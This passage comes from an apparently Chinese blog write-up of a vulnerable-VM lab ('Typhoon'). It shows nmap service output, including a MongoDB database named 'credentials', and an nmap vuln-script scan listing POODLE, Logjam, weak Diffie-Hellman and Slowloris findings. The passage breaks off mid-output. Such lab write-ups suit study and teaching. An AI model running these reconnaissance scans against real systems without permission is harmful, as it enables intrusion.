checkShardingIndex<br>|           failed = 0<br>|           total = 0<br>|         aggregate<br>|           failed = 0<br>|           total = 0<br>|         _recvChunkCommit<br>|           failed = 0<br>|           total = 0<br>|         cleanupOrphaned<br>|           failed = 0<br>|           total = 0<br>|         grantRolesToUser<br>|           failed = 0<br>|           total = 0<br>|         revokeRolesFromRole<br>|           failed = 0<br>|           total = 0<br>|         geoSearch<br>|           failed = 0<br>|           total = 0<br>|         getShardMap<br>|           failed = 0<br>|           total = 0<br>|         _recvChunkStart<br>|           failed = 0<br>|           total = 0<br>|         resync<br>|           failed = 0<br>|           total = 0<br>|         getLastError<br>|           failed = 0<br>|           total = 0<br>|         cloneCollection<br>|           failed = 0<br>|           total = 0<br>|         replSetGetStatus<br>|           failed = 0<br>|           total = 0<br>|         planCacheListFilters<br>|           failed = 0<br>|           total = 0<br>|         _mergeAuthzCollections<br>|           failed = 0<br>|           total = 0<br>|         listIndexes<br>|           failed = 0<br>|           total = 0<br>|         authenticate<br>|           failed = 0<br>|           total = 0<br>|         features<br>|           failed = 0<br>|           total = 0<br>|         shardConnPoolStats<br>|           failed = 0<br>|           total = 0<br>|         compact<br>|           failed = 0<br>|           total = 0<br>|         fsync<br>|           failed = 0<br>|           total = 0<br>|         collStats<br>|           failed = 0<br>|           total = 0<br>|         convertToCapped<br>|           failed = 0<br>|           total = 0<br>|         renameCollection<br>|           failed = 0<br>|           total = 0<br>|         distinct<br>|           failed = 0<br>|           total = 0<br>|         replSetFresh<br>|           failed = 0<br>|           total = 0<br>|         dropRole<br>|           failed = 0<br>|           total = 0<br>|       operation<br>|         fastmod = 0<br>|         writeConflicts = 0<br>|         idhack = 0<br>|         scanAndOrder = 0<br>|       record<br>|         moves = 0<br>|       storage<br>|         freelist<br>|           search<br>|             requests = 0<br>|             scanned = 0<br>|             bucketExhausted = 0<br>|       document<br>|         deleted = 0<br>|         inserted = 0<br>|         returned = 0<br>|         updated = 0<br>|     network<br>|       numRequests = 2<br>|       bytesOut = 10166<br>|       bytesIn = 128<br>|     opcountersRepl<br>|       <span class="hljs-built_in">command</span> = 0<br>|       insert = 0<br>|       update = 0<br>|       query = 0<br>|       delete = 0<br>|       getmore = 0<br>|     backgroundFlushing<br>|       last_ms = 0<br>|       last_finished = 1688255256082<br>|       flushes = 5<br>|       total_ms = 1<br>|       average_ms = 0.2<br>|     host = typhoon.local<br>|     opcounters<br>|       <span class="hljs-built_in">command</span> = 3<br>|       insert = 0<br>|       update = 0<br>|       query = 1<br>|       delete = 0<br>|       getmore = 0<br>|     <span class="hljs-built_in">uptime</span> = 357.0<br>|     storageEngine<br>|       name = mmapv1<br>|     version = 3.0.15<br>|     asserts<br>|       msg = 0<br>|       regular = 0<br>|       warning = 0<br>|       rollovers = 0<br>|       user = 0<br>|_    localTime = 1688255312772<br>| mongodb-databases: <br>|   ok = 1.0<br>|   totalSize = 167772160.0<br>|   databases<br>|     1<br>|       name = <span class="hljs-built_in">local</span><br>|       empty = <span class="hljs-literal">false</span><br>|       sizeOnDisk = 83886080.0<br>|     0<br>|       name = credentials<br>|       empty = <span class="hljs-literal">false</span><br>|_      sizeOnDisk = 83886080.0<br>34114/tcp open  status      1 (RPC <span class="hljs-comment">#100024)</span><br>34329/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>41559/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>43004/tcp open  nlockmgr    1-4 (RPC <span class="hljs-comment">#100021)</span><br>49357/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>MAC Address: 08:00:27:2D:C0:8F (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Hosts:  typhoon, TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>| smb2-security-mode: <br>|   3:0:0: <br>|_    Message signing enabled but not required<br>|_nbstat: NetBIOS name: TYPHOON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-07-01T23:48:32<br>|_  start_date: N/A<br>|_clock-skew: mean: 6h59m55s, deviation: 1h43m55s, median: 7h59m54s<br>| smb-os-discovery: <br>|   OS: Unix (Samba 4.1.6-Ubuntu)<br>|   Computer name: typhoon<br>|   NetBIOS computer name: TYPHOON\x00<br>|   Domain name: <span class="hljs-built_in">local</span><br>|   FQDN: typhoon.local<br>|_  System time: 2023-07-02T02:48:32+03:00<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 29.81 seconds<br></code></pre></td></tr></table></figure><p>emmm，信息好多啊，把漏洞脚本扫描一起做了，再进行分析吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p21,22,25,53,80,110,111,139,143,445,631,993,995,2049,3306,5432,6379,8080,27017,34114,34329,41559,43004,49357 192.168.56.121<br><br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 01:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.121<br>Host is up (0.00013s latency).<br><br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>22/tcp    open  ssh<br>25/tcp    open  smtp<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use anonymous<br>|       Diffie-Hellman key exchange only provide protection against passive<br>|       eavesdropping, and are vulnerable to active man-in-the-middle attacks<br>|       <span class="hljs-built_in">which</span> could completely compromise the confidentiality and integrity<br>|       of any data exchanged over the resulting session.<br>|     Check results:<br>|       ANONYMOUS DH GROUP 1<br>|             Cipher Suite: TLS_DH_anon_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: postfix <span class="hljs-built_in">builtin</span><br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|       https://www.ietf.org/rfc/rfc2246.txt<br>|   <br>|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)<br>|     State: VULNERABLE<br>|     IDs:  CVE:CVE-2015-4000  BID:74733<br>|       The Transport Layer Security (TLS) protocol contains a flaw that is<br>|       triggered when handling Diffie-Hellman key exchanges defined with<br>|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker<br>|       to downgrade the security of a TLS session to 512-bit export-grade<br>|       cryptography, <span class="hljs-built_in">which</span> is significantly weaker, allowing the attacker<br>|       to more easily <span class="hljs-built_in">break</span> the encryption and monitor or tamper with<br>|       the encrypted stream.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2015-5-19<br>|     Check results:<br>|       EXPORT-GRADE DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 512<br>|             Generator Length: 8<br>|             Public Key Length: 512<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000<br>|       https://www.securityfocus.com/bid/74733<br>|       https://weakdh.org<br>|   <br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: postfix <span class="hljs-built_in">builtin</span><br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|       TLS_FALLBACK_SCSV properly implemented<br>|     References:<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>| smtp-vuln-cve2010-4344: <br>|_  The SMTP server is not Exim: NOT VULNERABLE<br>53/tcp    open  domain<br>80/tcp    open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|_  /phpmyadmin/: phpMyAdmin</span><br><span class="hljs-string">| http-fileupload-exploiter: </span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|     Couldn&#x27;</span>t find a file-type field.<br>|   <br>|_    Couldn<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">110/tcp   open  pop3</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|       TLS_FALLBACK_SCSV properly implemented</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">111/tcp   open  rpcbind</span><br><span class="hljs-string">139/tcp   open  netbios-ssn</span><br><span class="hljs-string">143/tcp   open  imap</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|       TLS_FALLBACK_SCSV properly implemented</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">445/tcp   open  microsoft-ds</span><br><span class="hljs-string">631/tcp   open  ipp</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>993/tcp   open  imaps<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|       TLS_FALLBACK_SCSV properly implemented<br>|     References:<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>995/tcp   open  pop3s<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|       TLS_FALLBACK_SCSV properly implemented<br>|     References:<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>2049/tcp  open  nfs<br>3306/tcp  open  mysql<br>5432/tcp  open  postgresql<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2014-3566  BID:70574<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|       TLS_FALLBACK_SCSV properly implemented<br>|     References:<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: 